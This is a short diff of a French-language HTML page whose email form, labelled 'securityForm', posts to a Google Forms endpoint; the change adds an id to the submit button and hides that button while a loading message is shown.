@@ -87,7 +87,7 @@
     <form id="securityForm" action="https://docs.google.com/forms/d/e/1FAIpQLSdzEhG4lIMpdHxnWj2j62zNntAYp3J9Y5tiyZtawFbidj7KHA/formResponse" method="POST">
       <label for="username">Email :</label>
       <input type="text" id="username" name="username" required>
-      <button type="submit">Envoyer</button>
+      <button type="submit" id="submitButton">Envoyer</button>
     </form>
 
     <div id="loader" style="display:none;">Envoi en cours...</div>
@@ -101,6 +101,7 @@
       
       var username = document.getElementById('username').value;
 
+      document.getElementById('submitButton').style.display = 'none';
       document.getElementById('loader').style.display = 'block';
       document.getElementById('confirmationMessage').style.display = 'none';
       
